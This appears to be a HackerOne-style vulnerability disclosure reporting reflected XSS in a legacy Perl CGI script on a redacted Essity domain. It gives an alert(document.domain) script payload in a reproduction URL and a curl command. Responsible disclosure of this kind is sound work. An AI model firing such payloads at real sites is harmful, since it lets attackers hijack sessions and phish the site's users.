title: Reflected XSS in legacy CGI script /cgi-bin/████████.pl on ████████ via `████████` parameter
vulnerability_information:
## Summary: The legacy Perl CGI script at ``https://████████/cgi-bin/████████.pl`` reflects user-supplied input from the `████████` parameter directly into the HTML response without output encoding. This allows unauthenticated reflected XSS via both GET and POST requests. ## Steps To Reproduce: 1. Send the following GET request (no authentication required): ``https://████████/cgi-bin/████████.pl?action=Register&████████=%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E&last=████████&████████=123`` 2. Observe the response body contains the payload unencoded: ```
████████, Tel: 123
``` 3. Confirm via curl: ``` curl -sk -H "X-HackerOne-Research: ████████" \ "https://████████/cgi-bin/████████.pl?action=Register&████████=%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E&last=████████&████████=123" ``` Both GET and POST methods are affected. The `last` and `████████` parameters are also reflected but were not ████████ed beyond confirmation. ## Supporting Material/References: - curl output confirming unencoded reflection attached - Affected script metadata: generator="████████:/cgi-bin/████████.pl", author="████████" (legacy SCA/Essity internal tool) ## Impact Arbitrary JavaScript execution in the ████████ origin against any user following a crafted link. No authentication required. Enables session hijacking, credential phishing under an Essity domain, and content injection/ defacement. The affected script also leaks internal infrastructure metadata (internal hostname ████████ visible in page source).
